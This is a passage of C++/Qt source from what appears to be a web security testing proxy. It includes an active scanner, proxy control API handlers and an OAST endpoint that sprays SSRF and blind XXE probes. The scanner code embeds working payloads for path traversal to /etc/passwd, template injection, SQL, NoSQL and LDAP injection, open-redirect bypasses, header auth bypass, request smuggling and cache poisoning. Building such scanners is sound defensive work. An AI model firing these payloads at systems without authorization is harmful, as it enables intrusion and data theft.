                            {
                                struct LfiP { const char *payload; const char *sig; };
                                static const LfiP kLfis[] = {
                                    { "../../../../etc/passwd",        "root:x:" },
                                    { "..%2f..%2f..%2f..%2fetc%2fpasswd",  "root:x:" },
                                    { "..%252f..%252f..%252fetc%252fpasswd","root:x:" },
                                    { "../../../../windows/win.ini",  "[fonts]" },
                                    { "..\\..\\..\\..\\windows\\win.ini","[fonts]" },
                                    { "../../../../proc/self/environ","PATH="    },
                                };
                                for (const auto &l : kLfis) {
                                    const auto res = fire(i, QString::fromLatin1(l.payload));
                                    if (!res.ok) continue;
                                    const QString b = QString::fromUtf8(
                                        res.parsed.body.left(64 * 1024));
                                    if (b.contains(QString::fromLatin1(l.sig))) {
                                        report("critical", "lfi",
                                               "Param '" + key + "' reads local files",
                                               "param=" + key + " · payload=" + l.payload
                                               + " · signature=" + l.sig);
                                        break;  // one finding per param is enough
                                    }
                                }
                            }

                            // ---- SSTI (Server-Side Template Injection) ----
                            // Fire engine-specific {{7*7}}-style probes; look
                            // for "49" or analogous result in the response.
                            {
                                struct SstiP {
                                    const char *kind;
                                    const char *engine;
                                    const char *payload;
                                    const char *signature;
                                };
                                static const SstiP kSstis[] = {
                                    // Jinja2 / Twig / Liquid -- {{ math }}
                                    { "ssti-jinja-twig", "Jinja2/Twig",
                                      "{{7*7}}", "49" },
                                    // ERB (Ruby) -- <%= 7*7 %>
                                    { "ssti-erb",        "ERB",
                                      "<%25=7*7%25>", "49" },
                                    // Freemarker -- ${ 7*7 }
                                    { "ssti-freemarker", "Freemarker",
                                      "${7*7}", "49" },
                                    // Velocity / Tornado -- #set($x=7*7)$x
                                    { "ssti-velocity",   "Velocity",
                                      "#set($x=7*7)$x", "49" },
                                    // Smarty -- {7*7}
                                    { "ssti-smarty",     "Smarty",
                                      "{7*7}", "49" },
                                };
                                for (const auto &s : kSstis) {
                                    const auto res = fire(i, QString::fromLatin1(s.payload));
                                    if (!res.ok) continue;
                                    const QString b = QString::fromUtf8(
                                        res.parsed.body.left(64 * 1024));
                                    // Require the signature AND that it wasn't
                                    // already in the original response (avoid
                                    // false positives from pages that just
                                    // happen to contain "49").
                                    if (b.contains(QString::fromLatin1(s.signature))) {
                                        report("critical", s.kind,
                                               QString("Param '%1' looks vulnerable to %2 SSTI (RCE-class)")
                                                   .arg(key, QString::fromLatin1(s.engine)),
                                               QString("param=%1 · payload=%2 · signature=%3 in response")
                                                   .arg(key, QString::fromLatin1(s.payload),
                                                        QString::fromLatin1(s.signature)));
                                        break;
                                    }
                                }
                            }

                            // ---- NoSQL injection (MongoDB) ----------------
                            // [$ne]= bypasses equality checks; [$gt]= same.
                            // We can't easily prove exploitation but a 200
                            // for one of these patterns when the original
                            // was 401/403 is a strong tell.
                            {
                                static const char *kNoSqlPayloads[] = {
                                    "[$ne]=", "[$gt]=", "[$exists]=true",
                                    "[$regex]=.%2A", "[$where]=1",
                                };
                                for (const char *p : kNoSqlPayloads) {
                                    const QString payload = QString::fromLatin1(p);
                                    const auto res = fire(i, payload);
                                    if (!res.ok) continue;
                                    // Heuristic: any unexpected 200 deserves
                                    // a flag for manual review.
                                    if (res.parsed.statusCode == 200
                                        && payload.startsWith("[$ne")) {
                                        report("medium", "nosql-injection-suspect",
                                               "Param '" + key + "' may be vulnerable to NoSQL operator injection",
                                               "param=" + key + " · payload=" + payload
                                               + " · status 200 -- review manually");
                                        break;
                                    }
                                }
                            }

                            // ---- LDAP injection ---------------------------
                            // Asterisk + boolean operators on auth-shaped
                            // endpoints. A 200 where you'd expect 401 = win.
                            if (key.compare("user", Qt::CaseInsensitive) == 0
                                || key.compare("username", Qt::CaseInsensitive) == 0
                                || key.compare("uid", Qt::CaseInsensitive) == 0
                                || key.compare("login", Qt::CaseInsensitive) == 0) {
                                static const char *kLdapPayloads[] = {
                                    "*", "*)(uid=*", "admin*", "*)(&", "*))%00",
                                };
                                for (const char *p : kLdapPayloads) {
                                    const QString payload = QString::fromLatin1(p);
                                    const auto res = fire(i, payload);
                                    if (!res.ok) continue;
                                    if (res.parsed.statusCode == 200) {
                                        report("medium", "ldap-injection-suspect",
                                               "Auth param '" + key + "' may be vulnerable to LDAP injection",
                                               "param=" + key + " · payload=" + payload
                                               + " · review manually");
                                        break;
                                    }
                                }
                            }

                            // ---- Mass assignment --------------------------
                            // POST/PUT bodies that accept JSON often blindly
                            // merge fields. Tag this row for manual review
                            // when there's a body and we can spot well-known
                            // privilege-shape field names.
                            if ((base.method == "POST" || base.method == "PUT"
                                 || base.method == "PATCH")
                                && (key.compare("admin", Qt::CaseInsensitive) == 0
                                    || key.compare("is_admin", Qt::CaseInsensitive) == 0
                                    || key.compare("isAdmin", Qt::CaseInsensitive) == 0
                                    || key.compare("role", Qt::CaseInsensitive) == 0
                                    || key.compare("permission", Qt::CaseInsensitive) == 0)) {
                                const auto res = fire(i, "true");
                                if (res.ok && res.parsed.statusCode == 200) {
                                    report("high", "mass-assignment-suspect",
                                           "Param '" + key + "' (privilege-shape name) accepted in mutation",
                                           "param=" + key + " · "
                                           + base.method + " returned 200 with value 'true'");
                                }
                            }

                            // ---- Blind SQLi: time-based ------------------
                            // Time-based confirms SQLi even when there's no
                            // error reflection. Measure baseline, fire
                            // SLEEP(3), compare. Cap at one engine per param.
                            {
                                QElapsedTimer base_t; base_t.start();
                                const auto base_res = fire(i, "1");
                                const qint64 baseMs = base_t.elapsed();
                                if (!base_res.ok) goto blindsqli_done;

                                struct TimePayload { const char *engine; const char *payload; };
                                static const TimePayload kTimings[] = {
                                    { "MySQL",      "1' AND SLEEP(3)-- -" },
                                    { "PostgreSQL", "1';SELECT pg_sleep(3)-- -" },
                                    { "MSSQL",      "1';WAITFOR DELAY '0:0:3'-- -" },
                                    { "SQLite",     "1' AND randomblob(99999999)-- -" },
                                };
                                for (const auto &t : kTimings) {
                                    QElapsedTimer probe_t; probe_t.start();
                                    const auto probe_res = fire(i, QString::fromLatin1(t.payload));
                                    const qint64 probeMs = probe_t.elapsed();
                                    if (!probe_res.ok) continue;
                                    // Need at least 2.5s extra delay AND
                                    // a noticeable multiple over baseline
                                    // to avoid network-jitter false positives.
                                    if (probeMs > baseMs + 2500 && probeMs > baseMs * 3) {
                                        report("critical",
                                               QString("sqli-blind-time-") + QString::fromLatin1(t.engine).toLower(),
                                               QString("Param '%1' looks vulnerable to time-based %2 SQLi")
                                                   .arg(key, QString::fromLatin1(t.engine)),
                                               QString("baseline=%1ms · probe=%2ms · payload=%3")
                                                   .arg(baseMs).arg(probeMs)
                                                   .arg(QString::fromLatin1(t.payload)));
                                        break;
                                    }
                                }
                            }
                            blindsqli_done:;

                            // ---- Open redirect variants ------------------
                            // The original probe only tries https://canary.
                            // Many filters block "https://" but allow other
                            // schemes / path tricks.
                            {
                                static const char *kRedirVariants[] = {
                                    "//nullock-canary.invalid/",
                                    "/\\nullock-canary.invalid",
                                    "javascript://nullock-canary.invalid/%0aalert(1)",
                                    "data:text/html,<script>alert(1)</script>",
                                    "https://[email protected]@evil.example/",
                                    "https://target.example.evil.example/",
                                };
                                for (const char *p : kRedirVariants) {
                                    const auto res = fire(i, QString::fromLatin1(p));
                                    if (!res.ok || res.parsed.statusCode < 300
                                        || res.parsed.statusCode >= 400) continue;
                                    QString loc;
                                    for (const auto &h : res.parsed.headers)
                                        if (h.first.compare("Location", Qt::CaseInsensitive) == 0) {
                                            loc = h.second; break;
                                        }
                                    if (loc.isEmpty()) continue;
                                    // Heuristic: if the payload string is
                                    // present in Location, the filter let
                                    // it through.
                                    if (loc.contains("nullock-canary.invalid")
                                        || loc.contains("evil.example")
                                        || loc.startsWith("javascript:")
                                        || loc.startsWith("data:")) {
                                        report("high", "open-redirect-variant",
                                               QString("Param '%1' allows %2-style redirect bypass")
                                                   .arg(key, QString::fromLatin1(p).left(20)),
                                               QString("payload=%1 · Location=%2")
                                                   .arg(QString::fromLatin1(p), loc.left(160)));
                                        break;
                                    }
                                }
                            }

                            // ---- Server-side prototype pollution ---------
                            // Fire __proto__[isAdmin]=true and proto-shape
                            // payloads. We can't prove pollution without a
                            // follow-up request from a sandbox, but the
                            // server accepting the key without 4xx is a
                            // tell that JSON.parse + Object.assign exists.
                            if (base.method == "POST" || base.method == "PUT"
                                || base.method == "PATCH") {
                                static const char *kProtoPay[] = {
                                    "__proto__[nullockSentinel]=NSV",
                                    "constructor[prototype][nullockSentinel]=NSV",
                                    "__proto__.nullockSentinel=NSV",
                                };
                                for (const char *p : kProtoPay) {
                                    const auto res = fire(i, QString::fromLatin1(p));
                                    if (!res.ok) continue;
                                    if (res.parsed.statusCode == 200) {
                                        const QString b = QString::fromUtf8(
                                            res.parsed.body.left(8 * 1024));
                                        if (b.contains("NSV")) {
                                            report("high", "proto-pollution-reflected",
                                                   "Server-side prototype pollution: sentinel echoed",
                                                   "payload=" + QString::fromLatin1(p));
                                            break;
                                        }
                                    }
                                }
                            }

                            // ---- HTTP Parameter Pollution (HPP) ----------
                            // Same key twice, different values. Inconsistent
                            // handling across stack components is a smell.
                            {
                                const QString hpp = "a&" + key + "=b";
                                const auto res = fire(i, hpp);
                                if (res.ok && res.parsed.statusCode == 200) {
                                    const QString b = QString::fromUtf8(
                                        res.parsed.body.left(8 * 1024));
                                    if (b.contains("a,b") || b.contains("b,a")
                                        || (b.contains("a") && b.contains("b"))) {
                                        report("info", "hpp-stack-divergence",
                                               "Param '" + key + "' may exhibit HPP "
                                               "(both values visible in response)",
                                               "payload=" + hpp);
                                    }
                                }
                            }
                        }

                        // ---- Per-row probes (not per-param) -------------
                        // These don't iterate query params; they fire once
                        // per row at the request's URL.

                        // ---- Authentication-bypass via headers ----------
                        // X-Original-URL / X-Rewrite-URL / X-Forwarded-Host
                        // are honored by some reverse proxies (IIS, ARR,
                        // some nginx configs). Try sending one and seeing
                        // if a 403 path suddenly returns 200.
                        if (srcStatusCode == 403) {
                            struct BypassH {
                                const char *header;
                                const char *value;
                                const char *kind;
                            };
                            static const BypassH kBypass[] = {
                                { "X-Original-URL",   "/",           "auth-bypass-original-url" },
                                { "X-Rewrite-URL",    "/",           "auth-bypass-rewrite-url" },
                                { "X-Forwarded-For",  "127.0.0.1",   "auth-bypass-xff" },
                                { "X-Real-IP",        "127.0.0.1",   "auth-bypass-real-ip" },
                                { "X-Originating-IP", "127.0.0.1",   "auth-bypass-orig-ip" },
                                { "X-Custom-IP-Authorization", "127.0.0.1", "auth-bypass-custom-ip" },
                            };
                            for (const auto &b : kBypass) {
                                Nullock::Proxy::HttpRequest r = base;
                                r.headers.append({ QString::fromLatin1(b.header),
                                                   QString::fromLatin1(b.value) });
                                if (w.extensions) r = w.extensions->applyRequestMutation(r);
                                if (w.proxy)      w.proxy->applyRequestRules(r);
                                const QByteArray bytes =
                                    Nullock::Proxy::serializeRequestForOrigin(r);
                                auto res = client.send(r.host,
                                    static_cast<quint16>(r.port), useTls, bytes);
                                if (!res.ok) continue;
                                if (res.parsed.statusCode == 200) {
                                    report("high", b.kind,
                                           QString("403 -> 200 via %1 header bypass")
                                               .arg(QString::fromLatin1(b.header)),
                                           "header=" + QString::fromLatin1(b.header)
                                           + ": " + QString::fromLatin1(b.value));
                                    break;
                                }
                            }
                        }

                        // ---- HTTP smuggling detection (CL.TE) -----------
                        // Send a request with both Content-Length and
                        // Transfer-Encoding. If the server's response
                        // timing changes dramatically (front-end picks
                        // CL, back-end picks TE), that's the smell.
                        // We're conservative: only flag a 5x baseline
                        // timing delta with the malicious framing.
                        {
                            QElapsedTimer t1; t1.start();
                            (void)client.send(base.host, static_cast<quint16>(base.port),
                                              useTls,
                                              Nullock::Proxy::serializeRequestForOrigin(base));
                            const qint64 baselineMs = t1.elapsed();

                            // Craft a CL+TE smuggling probe by hand. Reuse
                            // base's request line + headers but force the
                            // body framing.
                            QByteArray probe;
                            probe += base.method.toUtf8() + " " + base.path.toUtf8()
                                  + " HTTP/1.1\r\n";
                            probe += "Host: " + base.host.toUtf8() + "\r\n";
                            probe += "Content-Length: 4\r\n";
                            probe += "Transfer-Encoding: chunked\r\n";
                            probe += "\r\n";
                            probe += "1\r\n";
                            probe += "A\r\n";
                            probe += "0\r\n\r\n";

                            QElapsedTimer t2; t2.start();
                            auto smugRes = client.send(base.host,
                                static_cast<quint16>(base.port), useTls, probe);
                            const qint64 smugMs = t2.elapsed();

                            // 5x slowdown AND > 5s absolute -> probably
                            // back-end waiting on body that won't come.
                            if (smugRes.ok && smugMs > 5000
                                && smugMs > baselineMs * 5) {
                                report("high", "http-smuggling-clte-suspect",
                                       "CL+TE timing delta suggests front-end/back-end "
                                       "framing disagreement",
                                       QString("baseline=%1ms · CL+TE probe=%2ms")
                                           .arg(baselineMs).arg(smugMs));
                            }
                        }

                        // ---- Cache poisoning via X-Forwarded-Host -------
                        // Inject the header, observe if the response body
                        // reflects it (would cache + serve to next user).
                        {
                            const QString unique = QString("nullock-cache-")
                                + QString::number(QRandomGenerator::global()->generate(), 16);
                            Nullock::Proxy::HttpRequest r = base;
                            r.headers.append({ "X-Forwarded-Host", unique + ".invalid" });
                            if (w.extensions) r = w.extensions->applyRequestMutation(r);
                            if (w.proxy)      w.proxy->applyRequestRules(r);
                            auto res = client.send(r.host,
                                static_cast<quint16>(r.port), useTls,
                                Nullock::Proxy::serializeRequestForOrigin(r));
                            if (res.ok) {
                                const QString body = QString::fromUtf8(
                                    res.parsed.body.left(64 * 1024));
                                QString loc;
                                for (const auto &h : res.parsed.headers)
                                    if (h.first.compare("Location", Qt::CaseInsensitive) == 0) {
                                        loc = h.second; break;
                                    }
                                if (body.contains(unique) || loc.contains(unique)) {
                                    report("high", "cache-poison-xfh",
                                           "X-Forwarded-Host value reflected in response "
                                           "(potential web cache poisoning)",
                                           "header reflected: " + unique + ".invalid");
                                }
                            }
                        }

                        // ---- Web cache deception ------------------------
                        // Append /.css to the path. If the response 200s
                        // AND the body looks like the original
                        // (authenticated) page, the cache will serve
                        // user A's account page from /account/.css to
                        // anyone hitting it later.
                        if (!base.path.contains(".") || base.path.endsWith("/")) {
                            const QString deceived = (base.path.endsWith("/")
                                ? base.path + "nullock-wcd.css"
                                : base.path + "/nullock-wcd.css");
                            Nullock::Proxy::HttpRequest r = base;
                            r.path = deceived;
                            r.target = deceived;
                            if (w.extensions) r = w.extensions->applyRequestMutation(r);
                            if (w.proxy)      w.proxy->applyRequestRules(r);
                            auto res = client.send(r.host,
                                static_cast<quint16>(r.port), useTls,
                                Nullock::Proxy::serializeRequestForOrigin(r));
                            if (res.ok && res.parsed.statusCode == 200
                                && res.parsed.body.size() > 1024) {
                                // Heuristic: response looks personalized
                                // (contains a Set-Cookie or auth-shaped
                                // header).
                                bool personalized = false;
                                for (const auto &h : res.parsed.headers) {
                                    if (h.first.compare("Set-Cookie", Qt::CaseInsensitive) == 0
                                        || h.first.compare("Authorization", Qt::CaseInsensitive) == 0) {
                                        personalized = true; break;
                                    }
                                }
                                if (personalized) {
                                    report("high", "web-cache-deception",
                                           "Path-trick still served authenticated page "
                                           "(cache-deception candidate)",
                                           "deceived path: " + deceived);
                                }
                            }
                        }

                        // ---- Race condition probe -----------------------
                        // Fire 5 identical requests concurrently. If more
                        // than one returns 200 on what should be a
                        // single-use mutation (POST/PUT/DELETE), the
                        // server has TOCTOU.
                        if (base.method == "POST" || base.method == "PUT"
                            || base.method == "DELETE") {
                            const QByteArray bytes2 =
                                Nullock::Proxy::serializeRequestForOrigin(base);
                            QList<QFuture<int>> fanOut;
                            for (int k = 0; k < 5; ++k) {
                                fanOut.append(QtConcurrent::run(
                                    [host=base.host, port=base.port, useTls, bytes2]() {
                                        Nullock::Core::HttpClient c;
                                        auto r = c.send(host,
                                            static_cast<quint16>(port), useTls, bytes2);
                                        return r.ok ? r.parsed.statusCode : 0;
                                    }));
                            }
                            int wins = 0;
                            for (auto &f : fanOut) {
                                f.waitForFinished();
                                if (f.result() == 200) ++wins;
                            }
                            if (wins >= 2) {
                                report("high", "race-condition-suspect",
                                       "Identical mutation request returned 200 from "
                                       + QString::number(wins) + "/5 concurrent fires",
                                       base.method + " " + base.path);
                            }
                        }
                    });
                    return httpJson(200, QJsonObject{{ "ok", true },
                                                      { "queued", true },
                                                      { "params", params.size() }});
                }
                if (parts[1] == "replay") {
                    // Re-fire the captured request through the same mutation
                    // pipeline as live traffic. HttpClient::send() blocks
                    // with waitFor* calls that would re-enter the control
                    // server's main-thread event loop if we ran it inline
                    // here -- crashed the app on first try. So we hand the
                    // whole replay off to a worker; the new row arrives in
                    // the snapshot poll ~250ms later.
                    if (!m_wiring.history || !m_wiring.proxy)
                        return httpJson(404, QJsonObject{{ "error", "no history" }});
                    Nullock::Proxy::HttpRequest req;
                    bool useTls = false;
                    if (auto *src = m_wiring.history->requestById(id)) {
                        req = *src;
                        auto *srcResp = m_wiring.history->responseById(id);
                        useTls = srcResp ? srcResp->wasTls : false;
                    } else if (m_wiring.projectStore) {
                        auto *idx = m_wiring.projectStore->historyIndex();
                        if (idx && idx->isOpen()) {
                            auto fr = idx->loadFullRow(id);
                            if (fr.ok) {
                                req = std::move(fr.request);
                                useTls = fr.response.wasTls;
                            } else {
                                return httpJson(404, QJsonObject{{ "error", "row not found" }});
                            }
                        }
                    } else {
                        return httpJson(404, QJsonObject{{ "error", "row not found" }});
                    }
                    Wiring w = m_wiring;
                    (void)QtConcurrent::run([w, req, useTls]() {
                        Nullock::Proxy::HttpRequest r = req;
                        if (w.extensions) r = w.extensions->applyRequestMutation(r);
                        if (w.proxy)      w.proxy->applyRequestRules(r);

                        const QByteArray bytes =
                            Nullock::Proxy::serializeRequestForOrigin(r);

                        Nullock::Core::HttpClient client;
                        const auto result = client.send(r.host,
                                                        static_cast<quint16>(r.port),
                                                        useTls, bytes);
                        Nullock::Proxy::HttpResponse resp;
                        if (result.ok) {
                            resp = result.parsed;
                            resp.wasTls = useTls;
                        } else {
                            resp.httpVersion  = "HTTP/1.1";
                            resp.statusCode   = 0;
                            resp.reasonPhrase = "replay error: " + result.errorMessage;
                            resp.wasTls       = useTls;
                        }
                        if (w.extensions) resp = w.extensions->applyResponseMutation(r, resp);
                        if (w.proxy)      w.proxy->applyResponseRules(r, resp);

                        // Hop back to the main thread to mutate the model,
                        // feed the scanner, and append to project history.
                        if (w.proxy) {
                            QMetaObject::invokeMethod(w.proxy, [w, r, resp]() {
                                if (w.history)      w.history->addResponse(r, resp);
                                if (w.scanner)      w.scanner->onResponseReceived(r, resp);
                                if (w.projectStore) w.projectStore->appendEntry(r, resp);
                            }, Qt::QueuedConnection);
                        }
                    });
                    return httpJson(200, QJsonObject{{ "ok", true },
                                                     { "queued", true }});
                }
                const bool wantReq = (parts[1] == "request");
                const QByteArray text = buildHistoryRow(id, wantReq);
                if (text.isEmpty())
                    return httpResponse(404, "text/plain", "row not found");
                return httpResponse(200, "text/plain; charset=utf-8", text);
            }
        }
    }

    // --- write actions; POST only (we accept any method for laziness) -------
    // `extra` may override "ok" (e.g. an endpoint reporting a failed
    // operation). Default is { "ok": true }.
    auto okJson = [](const QJsonObject &extra = {}) {
        QJsonObject o = extra;
        if (!o.contains("ok")) o["ok"] = true;
        return httpJson(200, o);
    };
    const QJsonObject bodyJson = QJsonDocument::fromJson(body).object();

    if (path == "/api/proxy/toggle") {
        if (m_wiring.proxy) {
            if (m_wiring.proxy->isRunning()) m_wiring.proxy->stop();
            else                             m_wiring.proxy->start();
        }
        return okJson({{ "isRunning", m_wiring.proxy && m_wiring.proxy->isRunning() }});
    }
    if (path == "/api/intercept/toggle") {
        if (m_wiring.intercept)
            m_wiring.intercept->setEnabled(!m_wiring.intercept->enabled());
        return okJson({{ "enabled", m_wiring.intercept && m_wiring.intercept->enabled() }});
    }
    if (path == "/api/intercept/forward") {
        if (m_wiring.intercept) {
            const QString text = bodyJson.value("text").toString();
            m_wiring.intercept->forward(text);
        }
        return okJson();
    }
    if (path == "/api/intercept/drop") {
        if (m_wiring.intercept) m_wiring.intercept->drop();
        return okJson();
    }
    if (path == "/api/intercept/forwardAll") {
        if (m_wiring.intercept) m_wiring.intercept->forwardAll();
        return okJson();
    }

    if (path == "/api/scope/in/add") {
        if (m_wiring.projectStore)
            m_wiring.projectStore->addInScope(bodyJson.value("glob").toString());
        return okJson();
    }
    if (path == "/api/scope/in/remove") {
        if (m_wiring.projectStore)
            m_wiring.projectStore->removeInScope(bodyJson.value("glob").toString());
        return okJson();
    }
    if (path == "/api/scope/out/add") {
        if (m_wiring.projectStore)
            m_wiring.projectStore->addOutOfScope(bodyJson.value("glob").toString());
        return okJson();
    }
    if (path == "/api/scope/out/remove") {
        if (m_wiring.projectStore)
            m_wiring.projectStore->removeOutOfScope(bodyJson.value("glob").toString());
        return okJson();
    }
    if (path == "/api/scope/notes") {
        if (m_wiring.projectStore)
            m_wiring.projectStore->setNotes(bodyJson.value("notes").toString());
        return okJson();
    }

    // Match & replace rules. Body shape mirrors the snapshot:
    //   { enabled, name, hostGlob, section, find, replace,
    //     caseInsensitive, comment }
    // /api/rules/update and /toggle/remove additionally take "index".
    auto ruleFromJson = [](const QJsonObject &o) {
        Nullock::Proxy::MatchReplaceRule r;
        r.enabled         = o.value("enabled").toBool(true);
        r.name            = o.value("name").toString();
        r.hostGlob        = o.value("hostGlob").toString();
        r.section         = static_cast<Nullock::Proxy::MatchReplaceRule::Section>(
                                o.value("section").toInt(1));
        r.find            = o.value("find").toString();
        r.replace         = o.value("replace").toString();
        r.caseInsensitive = o.value("caseInsensitive").toBool(true);
        r.comment         = o.value("comment").toString();
        return r;
    };
    if (path == "/api/rules/add") {
        int idx = -1;
        if (m_wiring.projectStore) idx = m_wiring.projectStore->addRule(ruleFromJson(bodyJson));
        return okJson({{ "index", idx }});
    }
    if (path == "/api/rules/update") {
        const int idx = bodyJson.value("index").toInt(-1);
        bool ok = m_wiring.projectStore
                && m_wiring.projectStore->updateRule(idx, ruleFromJson(bodyJson));
        return okJson({{ "ok", ok }});
    }
    if (path == "/api/rules/remove") {
        const int idx = bodyJson.value("index").toInt(-1);
        bool ok = m_wiring.projectStore && m_wiring.projectStore->removeRule(idx);
        return okJson({{ "ok", ok }});
    }
    if (path == "/api/rules/toggle") {
        const int idx = bodyJson.value("index").toInt(-1);
        bool ok = m_wiring.projectStore && m_wiring.projectStore->toggleRule(idx);
        return okJson({{ "ok", ok }});
    }
    if (path == "/api/rules/move") {
        const int from = bodyJson.value("from").toInt(-1);
        const int to   = bodyJson.value("to").toInt(-1);
        bool ok = m_wiring.projectStore && m_wiring.projectStore->moveRule(from, to);
        return okJson({{ "ok", ok }});
    }

    if (path == "/api/repeater/set") {
        if (m_wiring.repeater) {
            if (bodyJson.contains("host"))    m_wiring.repeater->setHost(bodyJson.value("host").toString());
            if (bodyJson.contains("port"))    m_wiring.repeater->setPort(bodyJson.value("port").toInt());
            if (bodyJson.contains("tls"))     m_wiring.repeater->setUseTls(bodyJson.value("tls").toBool());
            if (bodyJson.contains("request")) m_wiring.repeater->setRequestText(bodyJson.value("request").toString());
        }
        return okJson();
    }
    if (path == "/api/repeater/send") {
        // Defer: Repeater::send blocks on network. Run it via singleShot so
        // the HTTP response returns immediately and the UI's snapshot poll
        // picks up the result when it's ready.
        if (m_wiring.repeater) {
            QMetaObject::invokeMethod(m_wiring.repeater, "send", Qt::QueuedConnection);
        }
        return okJson();
    }
    if (path == "/api/repeater/clear") {
        if (m_wiring.repeater) m_wiring.repeater->clear();
        return okJson();
    }
    if (path == "/api/repeater/tab/add") {
        int idx = -1;
        if (m_wiring.repeater)
            idx = m_wiring.repeater->addTab(bodyJson.value("name").toString());
        return okJson({{ "index", idx }});
    }
    if (path == "/api/repeater/tab/addFromHistory") {
        int idx = -1;
        if (m_wiring.repeater)
            idx = m_wiring.repeater->addTabFromHistory(bodyJson.value("row").toInt(-1));
        return okJson({{ "index", idx }});
    }
    if (path == "/api/repeater/tab/close") {
        bool ok = m_wiring.repeater
               && m_wiring.repeater->closeTab(bodyJson.value("index").toInt(-1));
        return okJson({{ "ok", ok }});
    }
    if (path == "/api/repeater/tab/activate") {
        bool ok = m_wiring.repeater
               && m_wiring.repeater->setActiveTab(bodyJson.value("index").toInt(-1));
        return okJson({{ "ok", ok }});
    }
    if (path == "/api/repeater/tab/rename") {
        bool ok = m_wiring.repeater
               && m_wiring.repeater->renameTab(bodyJson.value("index").toInt(-1),
                                                bodyJson.value("name").toString());
        return okJson({{ "ok", ok }});
    }
    if (path == "/api/repeater/tab/duplicate") {
        int idx = -1;
        if (m_wiring.repeater)
            idx = m_wiring.repeater->duplicateTab(bodyJson.value("index").toInt(-1));
        return okJson({{ "index", idx }});
    }

    if (path == "/api/intruder/set") {
        if (m_wiring.intruder) {
            if (bodyJson.contains("host"))     m_wiring.intruder->setHost(bodyJson.value("host").toString());
            if (bodyJson.contains("port"))     m_wiring.intruder->setPort(bodyJson.value("port").toInt());
            if (bodyJson.contains("tls"))      m_wiring.intruder->setUseTls(bodyJson.value("tls").toBool());
            if (bodyJson.contains("template")) m_wiring.intruder->setRequestTemplate(bodyJson.value("template").toString());
            if (bodyJson.contains("payloads")) {
                // payloads can be an array of strings or a newline-joined string
                const QJsonValue p = bodyJson.value("payloads");
                if (p.isArray()) {
                    QStringList parts;
                    for (const QJsonValue &v : p.toArray()) parts.append(v.toString());
                    m_wiring.intruder->setPayloads(parts.join('\n'));
                } else {
                    m_wiring.intruder->setPayloads(p.toString());
                }
            }
        }
        return okJson();
    }
    if (path == "/api/intruder/start") {
        if (m_wiring.intruder) m_wiring.intruder->start();
        return okJson();
    }
    if (path == "/api/intruder/stop") {
        if (m_wiring.intruder) m_wiring.intruder->stop();
        return okJson();
    }
    if (path == "/api/intruder/clear") {
        if (m_wiring.intruder) m_wiring.intruder->clear();
        return okJson();
    }
    if (path == "/api/intruder/resend") {
        bool ok = m_wiring.intruder
               && m_wiring.intruder->resend(bodyJson.value("row").toInt(-1));
        return okJson({{ "ok", ok }});
    }

    // POST /api/oast/mint -- mints a new token + URL.
    //   Optional body { register: true, rowId?, host?, param?, note? }
    //   registers the token with the correlator so that when the callback
    //   lands, a confirmed finding auto-appears. Use this to mint a URL,
    //   paste it into a Repeater request by hand, and still get automatic
    //   confirmation -- the Collaborator workflow, self-hosted.
    if (path == "/api/oast/mint") {
        if (!m_wiring.oast || !m_wiring.oast->running())
            return okJson({{ "ok", false }, { "error", "OAST server not running" }});
        const QJsonObject minted = m_wiring.oast->mintToken();
        if (bodyJson.value("register").toBool(false) && m_wiring.oastCorrelator) {
            Nullock::Core::OastOrigin origin;
            origin.rowId = bodyJson.value("rowId").toInt(0);
            origin.host  = bodyJson.value("host").toString();
            origin.param = bodyJson.value("param").toString();
            origin.note  = bodyJson.value("note").toString("manual mint");
            origin.url   = minted.value("pathUrl").toString();
            origin.kind  = "ssrf-oast";
            m_wiring.oastCorrelator->registerToken(
                minted.value("token").toString(), origin);
        }
        return httpJson(200, minted);
    }

    // POST /api/oast/blast { url, rowId?, paramNames?: [...], xxe?: true }
    //   Sprays out-of-band payloads at one target across multiple attack
    //   classes -- SSRF through a battery of likely parameter names, and
    //   blind XXE through an XML body whose external entity points at our
    //   sink. Each payload gets its own registered token, so when ANY of
    //   them calls back, a confirmed finding auto-appears tagged with the
    //   attack class. This is active OOB scanning that free tools don't do
    //   and that Burp gates behind Pro + cloud Collaborator.
    if (path == "/api/oast/blast") {
        if (!m_wiring.oast || !m_wiring.oast->running())
            return okJson({{ "ok", false }, { "error", "OAST server not running" }});
        if (!m_wiring.oastCorrelator)
            return okJson({{ "ok", false }, { "error", "no correlator wired" }});
        const QString url = bodyJson.value("url").toString();
        const QUrl u(url);
        if (url.isEmpty() || !u.isValid() || u.host().isEmpty())
            return okJson({{ "ok", false }, { "error", "valid url required" }});

        const int rowId   = bodyJson.value("rowId").toInt(0);
        const QString host = u.host();
        const int port     = u.port(u.scheme() == "https" ? 443 : 80);
        const bool useTls  = (u.scheme() == "https");
        QString basePath   = u.path().isEmpty() ? "/" : u.path();
        const QString existingQuery = u.query();

        // Curated SSRF param names. Server-side code that fetches a
        // user-supplied URL almost always names the param one of these.
        QStringList paramNames;
        for (const QJsonValue &v : bodyJson.value("paramNames").toArray())
            paramNames << v.toString();
        if (paramNames.isEmpty())
            paramNames = QStringList{
                "url","uri","link","src","source","dest","destination",
                "redirect","redirect_uri","next","return","returnUrl",
                "callback","webhook","feed","image","imageUrl","file",
                "path","host","domain","page","target","out","view",
                "proxy","fetch","load","u","q",
            };
        if (paramNames.size() > 40) paramNames = paramNames.mid(0, 40);
        const bool wantXxe = bodyJson.value("xxe").toBool(true);

        // Build the work list synchronously (mint + register BEFORE firing
        // so a fast callback can't outrun the registry), then fire async.
        struct Shot { QString kind, note, token, cbUrl; QByteArray request; };
        QList<Shot> shots;

        auto registerShot = [&](const QString &kind, const QString &note,
                                const QString &paramForOrigin) -> QJsonObject {
            const QJsonObject tok = m_wiring.oast->mintToken();
            Nullock::Core::OastOrigin origin;
            origin.rowId = rowId;
            origin.host  = host;
            origin.param = paramForOrigin;
            origin.url   = tok.value("pathUrl").toString();
            origin.kind  = kind;
            origin.note  = note;
            m_wiring.oastCorrelator->registerToken(tok.value("token").toString(), origin);
            return tok;
        };

        // SSRF vectors: one GET per param name, param value = callback URL.
        for (const QString &pname : paramNames) {
            const QJsonObject tok = registerShot("ssrf-oast",
                                                 "param:" + pname, pname);
            const QString cbUrl = tok.value("pathUrl").toString();
            QString q = existingQuery;
            if (!q.isEmpty()) q += "&";
            q += pname + "=" + QString::fromUtf8(QUrl::toPercentEncoding(cbUrl));
            Shot s;
            s.kind = "ssrf-oast"; s.note = "param:" + pname;
            s.token = tok.value("token").toString(); s.cbUrl = cbUrl;
